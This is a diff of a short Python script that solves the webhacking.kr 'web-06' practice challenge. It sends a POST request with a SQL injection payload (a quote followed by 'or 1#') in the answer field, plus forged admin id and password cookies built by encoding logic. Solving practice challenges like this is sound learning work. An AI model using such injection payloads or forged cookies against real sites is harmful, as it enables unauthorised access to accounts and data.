@@ -1,4 +1,11 @@
 import base64
+import requests
+
+URL = "https://webhacking.kr/challenge/web-06/"
+SESSION_ID = "123"
+cookies = {'PHPSESSID':SESSION_ID}
+params ={'answer':1010100000011100101011111}
+data = {'answer':'1010100000011100101011111\' or 1#', 'id':'''0b100 '''}
 
 id = "admin"
 pw = "nimda"
@@ -25,5 +32,9 @@ pw.replace("*","6")
 pw.replace("(","7")
 pw.replace(")","8")
 
-print(f"id: {id}\n")
-print(f"pw: {pw}")
+
+cookies['user'] = id
+cookies['password'] = pw
+
+response = requests.post(URL, data=data, params=params, cookies=cookies)
+print(response.text)
